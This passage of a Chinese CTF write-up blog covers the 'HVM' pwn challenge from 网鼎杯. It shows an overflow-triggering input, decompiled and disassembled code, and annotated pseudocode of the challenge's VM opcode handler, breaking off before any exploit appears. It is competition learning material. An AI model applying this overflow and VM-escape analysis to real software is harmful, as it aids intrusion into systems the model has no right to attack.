@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="referrer" content="no-referrer" />
+    <meta name="description" content="HVM0x01 程序分析题目有两个文件: 12hvmhvmbin 猜测是存在vm保护先运行程序(hvm中open(‘&#x2F;hvmbin’),需要将hvmbin放入根目录下)： 1234.&#x2F;hvm                 hello               Kirin_say                  bye 程序过程: 123输出&quot;hello&quot;接收输入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯第二场_HVM&amp;&amp;easyFMT">
+<meta property="og:url" content="http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/index.html">
+<meta property="og:site_name" content="Kirin&#39;s Blog">
+<meta property="og:description" content="HVM0x01 程序分析题目有两个文件: 12hvmhvmbin 猜测是存在vm保护先运行程序(hvm中open(‘&#x2F;hvmbin’),需要将hvmbin放入根目录下)： 1234.&#x2F;hvm                 hello               Kirin_say                  bye 程序过程: 123输出&quot;hello&quot;接收输入">
+<meta property="article:published_time" content="2018-08-23T00:38:41.000Z">
+<meta property="article:modified_time" content="2018-09-23T12:40:26.000Z">
+<meta property="article:author" content="Kirin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>网鼎杯第二场_HVM&amp;&amp;easyFMT</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/08/25/%E5%AE%89%E6%81%92%E5%85%AB%E6%9C%88%E8%B5%9B-Re-PWN/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/08/21/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BA-Re-%E9%83%A8%E5%88%86Pwn/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&text=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&title=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&is_video=false&description=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=网鼎杯第二场_HVM&amp;&amp;easyFMT&body=Check out this article: http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&title=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&title=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&title=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&title=网鼎杯第二场_HVM&amp;&amp;easyFMT" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/08/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%BA%8C%E5%9C%BA-HVM-easyFMT/&name=网鼎杯第二场_HVM&amp;&amp;easyFMT&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HVM"><span class="toc-number">1.</span> <span class="toc-text">HVM</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-程序分析"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main"><span class="toc-number">1.1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set-up"><span class="toc-number">1.1.2.</span> <span class="toc-text">set_up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vm-handle"><span class="toc-number">1.1.3.</span> <span class="toc-text">vm_handle</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-漏洞"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-EXP"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyFMT"><span class="toc-number">2.</span> <span class="toc-text">easyFMT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-程序分析-amp-amp-漏洞"><span class="toc-number">2.1.</span> <span class="toc-text">0x01 程序分析&amp;&amp;漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-EXP："><span class="toc-number">2.2.</span> <span class="toc-text">0x02 EXP：</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        网鼎杯第二场_HVM&amp;&amp;easyFMT
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Kirin's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-08-23T00:38:41.000Z" itemprop="datePublished">2018-08-23</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="HVM"><a href="#HVM" class="headerlink" title="HVM"></a>HVM</h1><h2 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h2><p>题目有两个文件:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hvm</span><br><span class="line">hvmbin</span><br></pre></td></tr></table></figure>
+<p>猜测是存在vm保护<br>先运行程序(hvm中open(‘/hvmbin’),需要将hvmbin放入根目录下)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;hvm                 </span><br><span class="line">hello               </span><br><span class="line">Kirin_say                  </span><br><span class="line">bye</span><br></pre></td></tr></table></figure>
+<p>程序过程:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输出&quot;hello&quot;</span><br><span class="line">接收输入</span><br><span class="line">输出&quot;bye&quot;</span><br></pre></td></tr></table></figure>
+<p>初步猜测第二步输入因为长度问题造成栈溢出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;hvm</span><br><span class="line">hello</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">段错误 (核心已转储)</span><br></pre></td></tr></table></figure>
+<h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int fd; &#x2F;&#x2F; ST04_4</span><br><span class="line"></span><br><span class="line">  set_up();</span><br><span class="line">  fd &#x3D; open(&quot;&#x2F;hvmbin&quot;, 0);</span><br><span class="line">  read(fd, buf, 0xFA0uLL);</span><br><span class="line">  vm_handle();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="set-up"><a href="#set-up" class="headerlink" title="set_up"></a>set_up</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 set_up()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v0; &#x2F;&#x2F; ST08_8</span><br><span class="line"></span><br><span class="line">  v0 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  buf &#x3D; mmap(0LL, 0x2000uLL, 3, 34, -1, 0LL);</span><br><span class="line">  qword_2020E0 &#x3D; (__int64)mmap(0LL, 0x2000uLL, 3, 34, -1, 0LL);</span><br><span class="line">  memset(buf, 0, 0x2000uLL);</span><br><span class="line">  qword_202100 &#x3D; (__int64)buf;</span><br><span class="line">  qword_2020B8 &#x3D; qword_2020E0 + 4096;</span><br><span class="line">  qword_2020D0 &#x3D; qword_2020E0 + 4096;</span><br><span class="line">  alarm(0x1Eu);</span><br><span class="line">  return __readfsqword(0x28u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先nop掉alarm以便调试<br>可以看到<br>程序利用mmap分配两段内存分别作为vm代码段和vm栈段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">代码段：buf &#x3D; mmap(0LL, 0x2000uLL, 3, 34, -1, 0LL);</span><br><span class="line">栈段：qword_2020E0 &#x3D; (__int64)mmap(0LL, 0x2000uLL, 3, 34, -1, 0LL);</span><br></pre></td></tr></table></figure>
+<h3 id="vm-handle"><a href="#vm-handle" class="headerlink" title="vm_handle"></a>vm_handle</h3><p>程序在main中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd &#x3D; open(&quot;&#x2F;hvmbin&quot;, 0);</span><br><span class="line">read(fd, buf, 0xFA0uLL);</span><br></pre></td></tr></table></figure>
+<p>将hvmbin文件写入buf代码段<br>而后在vm_handle中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:0000559BC2092AA4                 push    rbp</span><br><span class="line">.text:0000559BC2092AA5                 mov     rbp, rsp</span><br><span class="line">.text:0000559BC2092AA8                 push    rbx</span><br><span class="line">.text:0000559BC2092AA9                 sub     rsp, 48h</span><br><span class="line">.text:0000559BC2092AAD                 mov     rax, fs:28h</span><br><span class="line">.text:0000559BC2092AB6                 mov     [rbp+var_18], rax</span><br><span class="line">.text:0000559BC2092ABA                 xor     eax, eax</span><br><span class="line">.text:0000559BC2092ABC                 mov     rax, cs:vm_ip</span><br><span class="line">.text:0000559BC2092AC3                 mov     eax, [rax]</span><br><span class="line">.text:0000559BC2092AC5                 mov     [rbp+var_50], eax</span><br><span class="line">.text:0000559BC2092AC8                 jmp     loc_559BC20931AE ; jumptable 0000000000000AF9 default case</span><br></pre></td></tr></table></figure>
+<p>通过vm_ip读取buf中的指令<br>而后:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:0000559BC2092ACD                 cmp     [rbp+var_50], 1Ah ; switch 27 cases</span><br><span class="line">.text:0000559BC2092AD1                 ja      loc_559BC20931AE ; jumptable 0000000000000AF9 default case</span><br><span class="line">.text:0000559BC2092AD7                 mov     eax, [rbp+var_50]</span><br><span class="line">.text:0000559BC2092ADA                 lea     rdx, ds:0[rax*4]</span><br><span class="line">.text:0000559BC2092AE2                 lea     rax, off_559BC20932D4</span><br><span class="line">.text:0000559BC2092AE9                 mov     eax, [rdx+rax]</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>通过switch不断解析这些指令，最终实现程序<br>vm_handle伪代码分析：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 vm_handle()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; &#x2F;&#x2F; ST20_4</span><br><span class="line">  int v1; &#x2F;&#x2F; ST1C_4</span><br><span class="line">  _DWORD *v2; &#x2F;&#x2F; rbx</span><br><span class="line">  _DWORD *v3; &#x2F;&#x2F; rbx</span><br><span class="line">  unsigned __int64 result; &#x2F;&#x2F; rax</span><br><span class="line">  int v5; &#x2F;&#x2F; [rsp+0h] [rbp-50h]</span><br><span class="line">  unsigned __int64 v6; &#x2F;&#x2F; [rsp+38h] [rbp-18h]</span><br><span class="line">  __int64 savedregs; &#x2F;&#x2F; [rsp+50h] [rbp+0h]</span><br><span class="line"></span><br><span class="line">  v6 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">LABEL_26:</span><br><span class="line">  while ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( (unsigned int)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1u:</span><br><span class="line">        vm_ip +&#x3D; 4LL;                           &#x2F;&#x2F; mov rax,n</span><br><span class="line">        vm_rax &#x3D; (signed int)convert(*(_DWORD *)vm_ip);</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 2u:</span><br><span class="line">        vm_ip +&#x3D; 4LL;                           &#x2F;&#x2F; mov rbx,n</span><br><span class="line">        vm_rbx &#x3D; (signed int)convert(*(_DWORD *)vm_ip);</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 3u:</span><br><span class="line">        vm_ip +&#x3D; 4LL;                           &#x2F;&#x2F; mov rcx,n</span><br><span class="line">        vm_rcx &#x3D; (signed int)convert(*(_DWORD *)vm_ip);</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 4u:</span><br><span class="line">        vm_ip +&#x3D; 4LL;                           &#x2F;&#x2F; mov rdx,n</span><br><span class="line">        vm_rdx &#x3D; (signed int)convert(*(_DWORD *)vm_ip);</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 5u:</span><br><span class="line">        vm_ip +&#x3D; 4LL;                           &#x2F;&#x2F; jmp 4*n</span><br><span class="line">        vm_ip +&#x3D; 4LL * (signed int)convert(*(_DWORD *)vm_ip);</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 6u:</span><br><span class="line">        v0 &#x3D; *(_DWORD *)vm_rsp;                 &#x2F;&#x2F; ret 4*(n+3)</span><br><span class="line">        vm_rsp +&#x3D; 4LL;</span><br><span class="line">        vm_ip &#x3D; (__int64)vm_base_addr + 4 * ((signed int)convert(v0) + 3LL);</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 7u:</span><br><span class="line">        vm_ip +&#x3D; 4LL;                           &#x2F;&#x2F; push n</span><br><span class="line">        v1 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        vm_rsp -&#x3D; 4LL;</span><br><span class="line">        *(_DWORD *)vm_rsp &#x3D; v1;</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 8u:</span><br><span class="line">        vm_rax &#x3D; vm_rsp;                        &#x2F;&#x2F; mov rax,rsp</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 9u:                                  &#x2F;&#x2F; mov rbx,rsp</span><br><span class="line">        vm_rbx &#x3D; vm_rsp;</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0xAu:</span><br><span class="line">        vm_rcx &#x3D; vm_rsp;                        &#x2F;&#x2F; mov rcx,rsp</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0xBu:</span><br><span class="line">        vm_rdx &#x3D; vm_rsp;                        &#x2F;&#x2F; mov rdx,rsp</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0xCu:                                &#x2F;&#x2F; mov rsi,rsp</span><br><span class="line">        vm_rsi &#x3D; vm_rsp;</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0xDu:</span><br><span class="line">        vm_rdi &#x3D; vm_rsp;                        &#x2F;&#x2F; mov rdi,rsp</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0xEu:                                &#x2F;&#x2F; syscall</span><br><span class="line">        __asm &#123; syscall; LINUX - &#125;</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0xFu:</span><br><span class="line">        vm_ip +&#x3D; 4LL;                           &#x2F;&#x2F; sub rsp,(n&#x2F;4)*4</span><br><span class="line">        vm_rsp -&#x3D; 4LL * ((signed int)convert(*(_DWORD *)vm_ip) &#x2F; 4);</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0x10u:</span><br><span class="line">        vm_rsp -&#x3D; 4LL;                          &#x2F;&#x2F; push rbp</span><br><span class="line">        v2 &#x3D; (_DWORD *)vm_rsp;</span><br><span class="line">        *v2 &#x3D; convert((vm_rbp - vm_stack) &gt;&gt; 2);</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0x11u:                               &#x2F;&#x2F; mov rbp,rsp</span><br><span class="line">        vm_rbp &#x3D; vm_rsp;</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0x12u:</span><br><span class="line">        vm_rsp &#x3D; vm_rbp;                        &#x2F;&#x2F; mov rsp,rbp</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0x13u:                               &#x2F;&#x2F; pop rbp</span><br><span class="line">        vm_rbp &#x3D; 4LL * (signed int)convert(*(_DWORD *)vm_rsp) + vm_stack;</span><br><span class="line">        vm_rsp +&#x3D; 4LL;</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0x14u:</span><br><span class="line">        vm_rsp -&#x3D; 4LL;                          &#x2F;&#x2F; push ip</span><br><span class="line">        v3 &#x3D; (_DWORD *)vm_rsp;</span><br><span class="line">        *v3 &#x3D; convert((vm_ip - (signed __int64)vm_base_addr) &gt;&gt; 2);</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD *)vm_ip;</span><br><span class="line">        break;</span><br><span class="line">      case 0x18u:</span><br><span class="line">        vm_ip +&#x3D; 4LL;                           &#x2F;&#x2F; mov rdi,n</span><br><span class="line">        vm_rdi &#x3D; (signed int)convert(*(_DWORD *)vm_ip);</span><br><span class="line">        vm_ip +&#x3D; 4LL;</span><br><span class="line">        v5 &#x3D; *(_DWORD 